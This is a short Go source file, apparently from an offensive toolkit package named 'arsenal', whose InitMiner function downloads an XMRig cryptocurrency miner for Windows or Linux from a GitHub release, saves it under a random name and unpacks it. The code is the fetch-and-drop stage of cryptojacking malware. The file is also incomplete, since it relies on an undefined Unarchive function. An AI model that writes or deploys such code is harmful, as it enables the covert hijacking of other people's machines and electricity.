package arsenal

import (
	xid "github.com/rs/xid"
	"fmt"
	"log"
	"github.com/mholt/archiver/v3"
	utils "../utils"
)

func InitMiner(platform string) {
	guid := xid.New()
	bin := guid.String()
	switch platform {
		case "windows":
			err := utils.DownloadFile("https://github.com/xmrig/xmrig/releases/download/v5.11.0/xmrig-5.11.0-gcc-win64.zip", bin)
			if err != nil {
				panic(err)
			}
		case "linux":
			err := utils.DownloadFile("https://github.com/xmrig/xmrig/releases/download/v5.11.0/xmrig-5.11.0-xenial-x64.tar.gz", bin)
			if err != nil {
				panic(err)
			}
		default:
			log.Fatal("Cannot determine OS version, aborting...")
	}
	err := Unarchive(bin, ".")
	if err != nil {
		log.Fatal(err)
	}
	
}